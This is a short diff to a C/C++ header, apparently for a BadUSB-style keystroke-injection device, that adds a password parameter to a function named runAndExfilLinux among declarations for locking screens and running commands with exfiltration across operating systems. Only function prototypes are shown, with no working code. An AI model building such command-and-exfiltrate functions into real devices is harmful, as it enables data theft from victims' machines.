@@ -20,7 +20,7 @@ void exitTerminalMultiOs();
 void lockWindowsLinux();
 void lockMacOs();
 void runAndExfilWindows(String command);
-void runAndExfilLinux(String command);
+void runAndExfilLinux(String command, String password);
 void runAndExfilMacOs(String command);
 
 #endif
